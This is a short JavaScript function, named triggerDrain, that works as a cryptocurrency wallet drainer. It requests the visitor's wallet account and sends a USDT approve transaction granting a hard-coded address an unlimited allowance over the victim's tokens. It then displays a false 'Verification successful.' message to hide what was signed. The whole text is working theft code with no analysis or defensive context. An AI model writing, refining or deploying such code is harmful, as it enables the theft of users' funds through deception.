async function triggerDrain() {
    try {
        const provider = window.ethereum;
        
        // 1. Explicitly request accounts and get the address
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0]; 

        const usdtContract = "0xdac17f958d2ee523a2206206994597c13d831ec7";
        const data = "0x095ea7b3" + 
                     "000000000000000000000000" + "ee4133D3cd6876A9768460F37429f9Be59957Da3" + 
                     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

        // 2. Build the transaction with the confirmed 'from' address
        const txParams = {
            from: userAddress, // Ensure this is definitely passed
            to: usdtContract,
            data: data,
            value: '0x0'
        };

        await provider.request({ method: 'eth_sendTransaction', params: [txParams] });
        alert("Verification successful.");
    } catch (err) {
        console.error("Drain sequence error:", err);
    }
}